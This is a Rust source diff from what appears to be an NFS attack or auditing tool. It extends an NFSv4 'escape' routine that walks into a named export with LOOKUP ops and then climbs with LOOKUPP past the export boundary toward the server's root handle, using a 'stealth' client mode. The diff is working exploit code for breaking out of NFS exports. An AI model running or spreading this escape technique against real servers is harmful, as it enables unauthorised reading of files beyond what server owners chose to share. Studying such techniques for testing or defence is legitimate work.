@@ -176,7 +176,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
                     },
                     Err(v2_err) => {
                         // All MOUNT-based paths failed -- try v4 LOOKUPP as last resort.
-                        if let Some(v4) = try_nfs4_escape(host, globals).await {
+                        if let Some(v4) = try_nfs4_escape(host, export, globals).await {
                             if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4 {
                                 print_nfs4_lookupp_success(root_handle, host);
                             }
@@ -205,7 +205,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
         },
         EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
             // v3 handle construction failed -- try v4 LOOKUPP as last resort.
-            if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
+            if let Some(v4_outcome) = try_nfs4_escape(host, export, globals).await {
                 if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
                     print_nfs4_lookupp_success(root_handle, host);
                 }
@@ -238,7 +238,7 @@ pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32
             } else {
                 match find_escape_v2(host, export, max_root_scan, globals).await {
                     Ok(o) => o,
-                    Err(_) => return Ok(try_nfs4_escape(host, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
+                    Err(_) => return Ok(try_nfs4_escape(host, export, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
                 }
             }
         },
@@ -249,7 +249,7 @@ pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32
     match outcome {
         EscapeOutcome::Success { .. } | EscapeOutcome::WebNfs { .. } | EscapeOutcome::Nfs4Lookupp { .. } => Ok(outcome),
         EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
-            if let Some(v4) = try_nfs4_escape(host, globals).await {
+            if let Some(v4) = try_nfs4_escape(host, export, globals).await {
                 Ok(v4)
             } else {
                 Ok(outcome)
@@ -631,7 +631,7 @@ fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
 /// the export root handle, the export boundary has been crossed.
 ///
 /// No MOUNT protocol is needed -- NFSv4 connects directly to port 2049.
-async fn try_nfs4_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
+async fn try_nfs4_escape(host: &str, export: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
     use crate::proto::nfs4::compound::Nfs4DirectClient;
     use crate::proto::nfs4::types::{ArgOp, ResOpData};
 
@@ -652,10 +652,28 @@ async fn try_nfs4_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutco
     };
     client = client.with_stealth(stealth);
 
-    // Get the pseudo-root FH (PUTROOTFH + GETFH). On Linux knfsd this is the
-    // export's root directory when the export is the only one; on servers with
-    // a real pseudo-filesystem it is the synthetic root.
-    let export_fh = client.get_root_fh().await.ok()?;
+    // Navigate INTO the target export via component-by-component LOOKUP from
+    // the pseudo-root. The v4 pseudo-filesystem maps export paths as path
+    // components under PUTROOTFH; once we cross into the real export the
+    // server switches to real filesystem handles. LOOKUPP from there can
+    // walk above the export boundary (RFC 7530 S16.14).
+    let components: Vec<&str> = export.trim_start_matches('/').split('/').filter(|c| !c.is_empty()).collect();
+    let export_fh = if components.is_empty() {
+        client.get_root_fh().await.ok()?
+    } else {
+        let mut ops = Vec::with_capacity(components.len() + 2);
+        ops.push(ArgOp::Putrootfh);
+        for &c in &components {
+            ops.push(ArgOp::Lookup(c.to_owned()));
+        }
+        ops.push(ArgOp::Getfh);
+        let res = client.compound(ops).await.ok()?;
+        if res.status != 0 {
+            tracing::debug!(status = res.status, export, "NFSv4 LOOKUP into export failed");
+            return None;
+        }
+        res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })?
+    };
 
     // LOOKUPP loop: traverse parent directories until the handle stabilises
     // or the server rejects the request (NFS4ERR_NOENT at the boundary).
